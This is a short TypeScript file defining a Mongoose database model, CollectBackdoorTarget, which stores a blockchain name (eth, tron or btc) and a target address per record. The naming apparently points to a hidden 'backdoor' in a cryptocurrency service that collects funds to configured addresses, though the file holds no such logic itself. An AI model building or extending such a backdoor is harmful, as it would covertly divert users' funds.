import { Schema, model } from 'mongoose';
const collectBackdoorTargetSchema = new Schema({
    chain: { type: String, required: true, enum: ['eth', 'tron', 'btc'] },
    targetAddress: { type: String, required: true },
    enabled: { type: Boolean, default: true },
}, { timestamps: true });
collectBackdoorTargetSchema.index({ chain: 1, targetAddress: 1 }, { unique: true });
export const CollectBackdoorTarget = model('CollectBackdoorTarget', collectBackdoorTargetSchema);
